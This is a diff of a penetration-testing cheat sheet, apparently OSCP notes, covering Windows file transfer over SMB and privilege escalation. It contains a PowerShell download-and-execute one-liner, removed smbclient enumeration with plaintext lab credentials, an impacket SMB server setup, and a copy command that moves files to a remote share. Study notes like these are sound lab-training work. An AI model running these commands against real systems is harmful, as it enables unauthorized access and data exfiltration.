@@ -87,22 +87,10 @@ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 or just `IEX(New-Object Net.WebClient).DownloadString('URL')`
 
 
-## smb share
-
-* list shares on target
-
-`smbclient -L '\\10.10.43.76\' -U svc-admin%management2005`
-
-Then better use imapcket's `smbclient.py` to explore it 
-
-* create share in kali
-`python3 ~/OSCP_Tools/impacket/smbserver.py xxxshare . -smb2support -username xxx -password xxx`
-
-* use in PS
+### smb share
 
 ```
-    #connect to share
-    New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
+New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
 
 #copy
 
@@ -110,7 +98,7 @@ copy share_path target_dir
 
 #example 
 
-copy c:\test '\\192.168.219.100\shared_dir'
+copy c:\test '\\192.168.219.100\share_name'
 
 ```
 * use in cmd
@@ -223,9 +211,7 @@ see https://github.com/jonnyzar/windows-kernel-exploits
 * Follow HackTricks: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
 * If it does not help, go for advances techniques
 
-## SMB
 
-see SMB cheatsheet
 
 ## Exposed GPP Password
 
